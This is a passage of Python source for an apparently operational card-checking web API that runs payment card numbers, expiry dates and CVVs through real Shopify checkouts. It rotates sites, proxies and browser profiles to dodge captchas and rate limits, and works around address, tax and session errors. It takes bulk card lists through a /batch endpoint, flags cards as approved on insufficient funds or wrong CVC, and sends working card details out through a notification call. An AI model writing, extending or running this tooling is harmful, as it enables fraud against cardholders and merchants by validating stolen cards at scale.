                    inp["delivery"]["deliveryLines"][0]["destination"]["streetAddress"] = dict(sa)
                    inp["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"any": True}
                except (KeyError, IndexError, TypeError):
                    pass
                try:
                    inp["payment"]["billingAddress"]["streetAddress"] = dict(sa)
                    inp["payment"]["paymentLines"][0]["paymentMethod"]["directPaymentMethod"][
                        "billingAddress"]["streetAddress"] = dict(sa)
                    inp["buyerIdentity"]["customer"]["countryCode"] = fb["countryCode"]
                    inp["buyerIdentity"]["phoneCountryCode"] = fb["countryCode"]
                except (KeyError, IndexError, TypeError):
                    pass
                node2, _ = await submit(nv)
                r2 = await eval_retry(node2)
                if r2[0] or not _is_retryable(r2[1]):
                    return r2
                return False, "DELIVERY_ADDRESS", gateway, total_price, currency, pstat

            # 4) VALIDATION_CUSTOM / missing session -> re-vault
            if ("validation_custom" in blob or "payment_gateway_validation_error" in blob
                    or "missing credit card session" in blob):
                fresh, _e = await vault_once(bool(purl))
                nv = _deep(sub_vars)
                if fresh:
                    try:
                        nv["input"]["payment"]["paymentLines"][0]["paymentMethod"][
                            "directPaymentMethod"]["sessionId"] = fresh
                    except (KeyError, IndexError, TypeError):
                        pass
                node2, _ = await submit(nv)
                r2 = await eval_retry(node2)
                if r2[0] or not _is_retryable(r2[1]):
                    return r2
                return False, "VALIDATION_CUSTOM", gateway, total_price, currency, pstat

            # 5) tax must be accepted
            if "tax_new_tax_must_be_accepted" in blob or "new tax" in blob:
                nt = tax_amount
                sp = node.get("sellerProposal") or {}
                try:
                    nt = float(((sp.get("tax") or {}).get("totalTaxAmount") or {})
                               .get("value", {}).get("amount"))
                except (TypeError, ValueError):
                    pass
                nv = _deep(sub_vars)
                try:
                    nv["input"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = f"{float(nt):.2f}"
                except (KeyError, TypeError, ValueError):
                    pass
                node2, _ = await submit(nv)
                r2 = await eval_retry(node2)
                if r2[0] or not _is_retryable(r2[1]):
                    return r2
                return False, "TAX_NEW_TAX_MUST_BE_ACCEPTED", gateway, total_price, currency, pstat

            # 6) required artifacts -> retry, phir physical product
            if "required_artifacts_unavailable" in blob:
                if not requires_shipping and not tried_digital:
                    await asyncio.sleep(1.0)
                    node2, _ = await submit(_deep(sub_vars))
                    r2 = await eval_retry(node2)
                    if r2[0]:
                        return r2
                    phys, _pe = await fetch_products(ourl, purl, sess=sess, prof=prof,
                                                     physical_only=True)
                    if phys:
                        return await _process_card(cc, mes, ano, cvv, site_url,
                                                  None, proxy_str, overrides, prof, phys, True)
                return False, "No delivery available (site ships locally only)", \
                    gateway, total_price, currency, pstat

            for e in errs:
                code = e.get("code") or ""
                if code:
                    return False, code, gateway, total_price, currency, pstat
                loc = e.get("localizedMessage")
                if loc:
                    return False, clean_resp(loc), gateway, total_price, currency, pstat
            return False, "Submit Rejected", gateway, total_price, currency, pstat

        # success family
        rc = node.get("receipt") or {}
        rtn = rc.get("__typename", "")
        if rtn == "ProcessedReceipt":
            return True, "ORDER_PLACED", gateway, total_price, currency, pstat
        if rtn == "ActionRequiredReceipt":
            return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
        if rtn == "FailedReceipt":
            err = rc.get("processingError") or {}
            if err.get("__typename") == "PaymentFailed":
                code = err.get("code") or ""
                msg = err.get("messageUntranslated") or ""
                if code in ("", "GENERIC_ERROR", "PAYMENT_FAILED") and msg:
                    return False, msg, gateway, total_price, currency, pstat
                return False, code or "CARD_DECLINED", gateway, total_price, currency, pstat
            return False, err.get("__typename") or "CARD_DECLINED", gateway, total_price, currency, pstat
        rid = rc.get("id")
        if rid:
            return await poll(rid)
        return False, "CARD_DECLINED", gateway, total_price, currency, pstat

    except asyncio.TimeoutError:
        return False, "REQUEST_TIMEOUT", gateway, total_price, currency, ("Dead" if purl else pstat)
    except Exception as e:
        msg = str(e)
        ps = "Dead" if (purl and _is_net_err(msg)) else pstat
        return False, f"Connection error: {msg[:120]}", gateway, total_price, currency, ps
    finally:
        try:
            await sess.close()
        except Exception:
            pass


# ── retry wrapper ───────────────────────────────────────────────────────────
def _site_pool(site_param):
    out = []
    if site_param:
        for s in str(site_param).split(","):
            s = s.strip()
            if s:
                out.append(s)
    for s in _SITES:
        if s not in out:
            out.append(s)
    return out[:MAX_SITES] if out else []


async def process_card(cc, mes, ano, cvv, site_param, variant_id, proxy_str, overrides):
    pool = _site_pool(site_param)
    if not pool:
        return False, "No sites", "UNKNOWN", "0.00", "USD", "Not Used"

    captcha_budget = RETRY_CAPTCHA
    last = (False, "No sites", "UNKNOWN", "0.00", "USD", "Not Used")
    idx = 0
    total = MAX_RETRIES + RETRY_CAPTCHA + 2

    for attempt in range(total):
        site = pool[idx % len(pool)]
        idx += 1
        await _rl_wait()
        prof = _pick_profile()

        host = urlparse(_norm(site)).netloc
        cur_proxy = proxy_str
        if cur_proxy and (_pcool_bad(cur_proxy) or _site_proxy_cooled(host, cur_proxy)):
            cur_proxy = None

        try:
            res = await _process_card(cc, mes, ano, cvv, site, variant_id,
                                      cur_proxy, overrides, prof)
        except Exception as e:
            res = (False, f"Connection error: {e}", "UNKNOWN", "0.00", "USD", "Not Used")
        last = res
        if res[0]:
            return res

        msg = res[1]
        if not _is_retryable(msg):
            return res

        if _is_captcha(msg):
            _bump("captcha")
            if captcha_budget <= 0:
                return res
            captcha_budget -= 1
            await asyncio.sleep(0.2 + random.random() * 0.35)
            continue

        if msg in ("SCHEMA_DRIFT", "GRAPHQL_SYNTAX"):
            _bump("drift")
            _flip_variant(host)
            continue

        if _is_rl(msg):
            _rl_pause()
            _pcool_mark(proxy_str)
            _cool_proxy(proxy_str)
            await asyncio.sleep(0.25 + random.random() * 0.4)
            continue

        if _is_net_err(msg):
            _cool_proxy(proxy_str)
            _mark_proxy_fail(proxy_str)
            await asyncio.sleep(0.1 + random.random() * 0.2)
            continue

        _bump("retry")
        await asyncio.sleep(0.2 + random.random() * 0.4)

    return last


# ── result building ─────────────────────────────────────────────────────────
def build_result(cc_string, success, message, gateway, price, currency, elapsed, pstat):
    resp = sanitize(clean_resp(message))
    try:
        pf = round(float(price), 2)
    except (TypeError, ValueError):
        pf = 0.0
    ps = pstat if pstat in ("Live", "Dead", "Not Used") else "Not Used"
    charged = "True" if resp == "ORDER_PLACED" else "False"
    approved = "True" if (success or resp in ("INSUFFICIENT_FUNDS", "INCORRECT_CVC")) else "False"
    return {"cc": cc_string, "Gateway": gateway or "Shopify Payments", "Response": resp,
            "Price": pf, "Currency": currency or "USD", "Status": bool(success),
            "Charged": charged, "Approved": approved, "Proxy": ps,
            "Time": f"{float(elapsed):.2f}s"}


def _dumps(o):
    return json.dumps(o, ensure_ascii=False)


_CARD_RE = re.compile(r"[^0-9]")


def parse_card(s):
    raw = str(s).strip()
    if "|" in raw:
        p = [x.strip() for x in raw.split("|")]
    elif "/" in raw:
        p = [x.strip() for x in raw.split("/")]
    elif " " in raw and len(raw.split()) >= 4:
        p = [x.strip() for x in raw.split()[:4]]
    else:
        m = re.match(r"^(\d{12,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})$", raw)
        if not m:
            raise ValueError("Invalid card format. Use: CARD|MM|YYYY|CVV")
        p = list(m.groups())
    if len(p) != 4:
        raise ValueError("Invalid card format. Use: CARD|MM|YYYY|CVV")
    cc, mes, ano, cvv = p
    cc = _CARD_RE.sub("", cc)
    cvv = _CARD_RE.sub("", cvv)
    if not 12 <= len(cc) <= 19:
        raise ValueError("Invalid card number length")
    if len(ano) == 2:
        ano = "20" + ano
    mes = mes.zfill(2)
    if not mes.isdigit() or not ano.isdigit() or not cvv:
        raise ValueError("Invalid card format. Use: CARD|MM|YYYY|CVV")
    if LUHN_CHECK and not luhn_ok(cc):
        raise ValueError("Card failed Luhn check")
    return {"cc": cc, "mes": mes, "ano": ano, "cvv": cvv}


def _overrides(q):
    m = {"first": "first", "last": "last", "email": "email", "phone": "phone",
         "address1": "address1", "address": "address1", "city": "city",
         "state": "zoneCode", "zip": "postalCode", "country": "countryCode"}
    out = {}
    for qk, ak in m.items():
        v = q.get(qk)
        if v:
            out[ak] = v
    return out or None


# ── routes ──────────────────────────────────────────────────────────────────
routes = web.RouteTableDef()


@routes.get("/")
@routes.get("/shopify")
async def shopify(request):
    global _worker_busy
    if _worker_busy >= MAX_WORKERS:
        return web.json_response({"error": "at capacity"}, status=503, dumps=_dumps)

    t0 = time.time()
    q = request.query
    card_in = q.get("card") or q.get("cc") or ""
    site = q.get("site") or ""

    if not site and not _SITES:
        return web.json_response({"error": "Missing 'site' and no sites.txt"},
                                 status=400, dumps=_dumps)
    if not card_in:
        return web.json_response({"error": "Missing 'card'"}, status=400, dumps=_dumps)
    try:
        p = parse_card(card_in)
    except ValueError as e:
        return web.json_response({"error": str(e)}, status=400, dumps=_dumps)

    proxy_str = q.get("proxy")
    if proxy_str and "," in proxy_str:
        opts = [x.strip() for x in proxy_str.split(",") if x.strip()]
        proxy_str = random.choice(opts) if opts else None

    _worker_busy += 1
    _bump("total")
    try:
        ok, msg, gw, price, cur, ps = await asyncio.wait_for(
            process_card(p["cc"], p["mes"], p["ano"], p["cvv"], site,
                         q.get("variant"), proxy_str, _overrides(q)),
            timeout=CARD_DEADLINE)
    except asyncio.TimeoutError:
        ok, msg, gw, price, cur, ps = False, "REQUEST_TIMEOUT", "UNKNOWN", "0.00", "USD", "Not Used"
    finally:
        _worker_busy -= 1

    out = build_result(card_in, ok, msg, gw, price, cur, time.time() - t0, ps)
    out["site"] = site
    out["Dev"] = DEV
    _bump("ok" if ok else "declined")
    if ok:
        asyncio.create_task(tg_notify(p["cc"], p["mes"], p["ano"], p["cvv"], gw,
                                      price, cur, site))
    return web.json_response(out, dumps=_dumps)


@routes.post("/batch")
async def batch(request):
    proxy_str = request.query.get("proxy")
    body = await request.text()
    cards = [l.strip() for l in body.splitlines() if l.strip() and not l.startswith("#")]
    if not cards:
        return web.json_response({"error": "No cards"}, status=400, dumps=_dumps)

    resp = web.StreamResponse(headers={"Content-Type": "application/x-ndjson"})
    await resp.prepare(request)

    sem = asyncio.Semaphore(min(BATCH_WORKERS, max(1, len(cards))))
    queue = asyncio.Queue()

    async def worker(line):
        async with sem:
            t0 = time.time()
            try:
                p = parse_card(line)
                ok, msg, gw, price, cur, ps = await asyncio.wait_for(
                    process_card(p["cc"], p["mes"], p["ano"], p["cvv"], "", None,
                                 proxy_str, None),
                    timeout=CARD_DEADLINE)
            except Exception as e:
                ok, msg, gw, price, cur, ps = False, str(e)[:80], "UNKNOWN", "0.00", "USD", "Not Used"
            out = build_result(line, ok, msg, gw, price, cur, time.time() - t0, ps)
            await queue.put(out)

    tasks = [asyncio.create_task(worker(c)) for c in cards]
    for _ in cards:
        out = await queue.get()
        await resp.write((json.dumps(out) + "\n").encode())
        _bump("batch_cards")
    await asyncio.gather(*tasks, return_exceptions=True)
    await resp.write_eof()
    return resp


@routes.get("/health")
async def health(request):
    return web.json_response({"status": "ok", "sites": len(_SITES),
                              "workers_cap": MAX_WORKERS, "workers_busy": _worker_busy,
                              "Dev": DEV}, dumps=_dumps)


@routes.get("/stats")
async def stats(request):
    s = dict(STATS)
    s["uptime_sec"] = round(time.time() - _START, 1)
    s["sites"] = len(_SITES)
    s["workers_busy"] = _worker_busy
    s["mode"] = "slim" if _SLIM["on"] else "full"
    s["Dev"] = DEV
    return web.json_response(s, dumps=_dumps)


@routes.get("/status")
async def status(request):
    return web.json_response({
        "status": "online", "engine": "curl_cffi", "query_mode":
        "slim" if _SLIM["on"] else "full", "workers_cap": MAX_WORKERS,
        "workers_busy": _worker_busy, "cached_sites": len(_SITE_CACHE),
        "variant_overrides": len(_SITE_VARIANT), "profiles": len(_PROFILES_READY),
        "rl_pause_until": round(_RL_UNTIL, 2), "Dev": DEV,
        "endpoint": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
    }, dumps=_dumps)


def load_sites():
    try:
        with open("sites.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                _SITES.append(_norm(line))
    except FileNotFoundError:
        log.warning("sites.txt not found — only ?site= will work")
    log.info("[api] %d sites loaded", len(_SITES))


async def _janitor():
    while True:
        await asyncio.sleep(30)
        try:
            _prune_state()
        except Exception:
            pass


def build_app():
    app = web.Application(client_max_size=64 * 1024 * 1024)
    app.add_routes(routes)

    async def _on_start(app_):
        global _pci_sem
        _pci_sem = asyncio.Semaphore(PCI_LIMIT)
        _init_profiles()
        load_sites()
        _check_queries()
        asyncio.create_task(_janitor())
        log.info("[ENGINE] port=%s workers=%s pci=%s profiles=%s mode=%s dev=%s",
                 PORT, MAX_WORKERS, PCI_LIMIT, len(_PROFILES_READY),
                 "slim" if _SLIM["on"] else "full", DEV)

    app.on_startup.append(_on_start)
    return app


def main():
    global PORT, HOST
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--host", type=str, default=HOST)
    a = ap.parse_args()
    PORT, HOST = a.port, a.host
    web.run_app(build_app(), host=HOST, port=PORT, backlog=8192,
                keepalive_timeout=75, access_log=None, print=None)


if __name__ == "__main__":
    main()
